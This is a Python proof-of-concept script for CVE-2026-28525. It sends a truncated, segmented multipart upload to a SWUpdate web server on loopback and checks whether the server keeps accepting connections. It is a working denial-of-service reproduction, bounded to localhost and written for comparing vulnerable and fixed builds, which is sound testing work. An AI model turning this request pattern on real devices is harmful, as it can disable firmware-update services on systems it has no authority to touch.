"""Send one segmented multipart request to a loopback SWUpdate web server.

This is a bounded local test of CVE-2026-28525. It never supplies a valid
firmware image. Compare `truncated` with `complete` against separate
vulnerable and fixed SWUpdate processes; a closed socket is not proof of DoS.
"""

import argparse
import json
import re
import socket
import time
from dataclasses import dataclass


@dataclass(frozen=True)
class RequestParts:
    boundary: str
    header: bytes
    prefix: bytes
    final_chunk: bytes
    actual_body_length: int
    declared_content_length: int


def decode_terminal_chunk(*, boundary: str, terminal_chunk_escaped: str) -> bytes:
    """Accept only a literal escaped multipart close for the selected boundary."""
    if not isinstance(boundary, str) or not re.fullmatch(r"[A-Za-z0-9]{1,24}", boundary):
        raise ValueError("boundary must contain 1..24 ASCII letters or numbers")
    if not isinstance(terminal_chunk_escaped, str) or len(terminal_chunk_escaped) > 40:
        raise ValueError("final chunk must be at most 40 escaped characters")
    base = r"\r\n--" + boundary + "--"
    if terminal_chunk_escaped not in (base, base + r"\r\n"):
        raise ValueError("final chunk must match the selected boundary and CRLF format")
    suffix = f"\r\n--{boundary}--".encode("ascii")
    return suffix + (b"\r\n" if terminal_chunk_escaped == base + r"\r\n" else b"")


def _prefix(boundary: str) -> bytes:
    return (
        f"--{boundary}\r\n"
        'Content-Disposition: form-data; name="file"; filename="probe.swu"\r\n'
        "Content-Type: application/octet-stream\r\n\r\n"
    ).encode("ascii")


def build_request(
    *, boundary: str, terminal_chunk_escaped: str, declared_content_length: int,
) -> RequestParts:
    final_chunk = decode_terminal_chunk(
        boundary=boundary, terminal_chunk_escaped=terminal_chunk_escaped,
    )
    if type(declared_content_length) is not int or not 1 <= declared_content_length <= 512:
        raise ValueError("Content-Length must be an integer from 1 to 512")
    prefix = _prefix(boundary)
    actual = len(prefix) + len(final_chunk)
    if declared_content_length != actual:
        raise ValueError(f"Content-Length mismatch: declared {declared_content_length}, actual {actual}")
    header = (
        "POST /upload HTTP/1.1\r\n"
        "Host: 127.0.0.1\r\n"
        f"Content-Type: multipart/form-data; boundary={boundary}\r\n"
        f"Content-Length: {declared_content_length}\r\n"
        "Connection: keep-alive\r\n\r\n"
    ).encode("ascii")
    return RequestParts(boundary, header, prefix, final_chunk, actual, declared_content_length)


def read_http_response(connection: socket.socket, *, max_bytes: int = 8192,
                       timeout_seconds: float = 3.0) -> bytes:
    """Read a bounded response even when TCP splits its headers and body."""
    if max_bytes < 1 or timeout_seconds <= 0:
        raise ValueError("response limits must be positive")
    deadline = time.monotonic() + timeout_seconds
    response = bytearray()
    while len(response) < max_bytes:
        remaining = deadline - time.monotonic()
        if remaining <= 0:
            break
        connection.settimeout(min(1.0, remaining))
        try:
            chunk = connection.recv(min(4096, max_bytes - len(response)))
        except socket.timeout:
            continue
        if not chunk:
            break
        response.extend(chunk)
        header_end = response.find(b"\r\n\r\n")
        if header_end >= 0:
            header = response[:header_end]
            content_length = re.search(rb"(?im)^Content-Length:[ \t]*(\d+)[ \t]*\r?$", header)
            if content_length and len(response) - header_end - 4 >= int(content_length.group(1)):
                break
    return bytes(response)


def probe_custom(*, port: int, request: RequestParts) -> dict[str, object]:
    if not (1024 <= port <= 65535):
        raise ValueError("port must be 1024..65535")
    first_chunk = request.header + request.prefix
    final_chunk = request.final_chunk
    mode = "complete" if final_chunk.endswith(b"\r\n") else "truncated"
    response = b""
    socket_error = None
    with socket.create_connection(("127.0.0.1", port), timeout=2) as connection:
        connection.settimeout(1)
        connection.sendall(first_chunk)
        time.sleep(0.35)
        try:
            connection.sendall(final_chunk)
            time.sleep(0.35)
            response = read_http_response(connection)
        except (OSError, TimeoutError) as exc:
            socket_error = f"{type(exc).__name__}: {exc}"
    alive = False
    try:
        with socket.create_connection(("127.0.0.1", port), timeout=1):
            alive = True
    except OSError:
        pass
    return {
        "mode": mode,
        "boundaryLength": len(request.boundary),
        "finalChunkLength": len(final_chunk),
        "firstChunk": first_chunk.decode("ascii"),
        "finalChunk": final_chunk.decode("ascii"),
        "firstChunkHex": first_chunk.hex(),
        "finalChunkHex": final_chunk.hex(),
        "declaredContentLength": request.declared_content_length,
        "actualBodyLength": request.actual_body_length,
        "pauseMilliseconds": 350,
        "shortTerminalChunk": mode == "truncated" and len(final_chunk) == len(request.boundary) + 6,
        "httpResponse": response.decode("latin-1", errors="replace")[:1000],
        "socketError": socket_error,
        "serverAcceptsNewConnections": alive,
    }


def probe(port: int, boundary: str, mode: str) -> dict[str, object]:
    """Compatibility entry point for the original fixed two-mode reproduction."""
    if mode not in ("truncated", "complete"):
        raise ValueError("mode must be truncated or complete")
    if not isinstance(boundary, str) or not re.fullmatch(r"[A-Za-z0-9]{1,24}", boundary):
        raise ValueError("boundary must contain 1..24 ASCII letters or numbers")
    terminal = r"\r\n--" + boundary + "--" + (r"\r\n" if mode == "complete" else "")
    request = build_request(
        boundary=boundary, terminal_chunk_escaped=terminal,
        declared_content_length=len(_prefix(boundary)) + len(decode_terminal_chunk(
            boundary=boundary, terminal_chunk_escaped=terminal,
        )),
    )
    return probe_custom(port=port, request=request)


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("--port", type=int, required=True)
    parser.add_argument("--boundary", default="ABC")
    parser.add_argument("--mode", choices=("truncated", "complete"), required=True)
    arguments = parser.parse_args()
    print(json.dumps(probe(arguments.port, arguments.boundary, arguments.mode)))
